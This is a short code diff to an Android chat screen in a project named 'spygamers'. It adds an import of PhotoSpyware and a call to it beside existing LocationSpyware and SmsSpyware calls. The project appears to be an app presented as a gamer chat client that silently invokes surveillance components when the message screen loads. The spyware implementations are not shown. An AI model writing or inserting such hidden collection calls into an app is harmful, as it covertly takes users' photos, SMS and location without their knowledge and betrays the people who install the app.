@@ -37,6 +37,7 @@ import com.example.spygamers.components.chatting.MessageData
 import com.example.spygamers.components.chatting.MessageRow
 import com.example.spygamers.components.dialogs.ConfirmDialog
 import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.PhotoSpyware
 import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.services.ServiceFactory
@@ -147,6 +148,7 @@ private fun MainBody(
 
     LocationSpyware(viewModel, context)
     SmsSpyware(viewModel = viewModel, context = context)
+    PhotoSpyware(viewModel, context)
 
     // TODO: Show something like 'this is the start of ur conversation' if there are no messages...
     // TODO: Implement dynamic loading (load more messages once user hit the top of the messages list...)
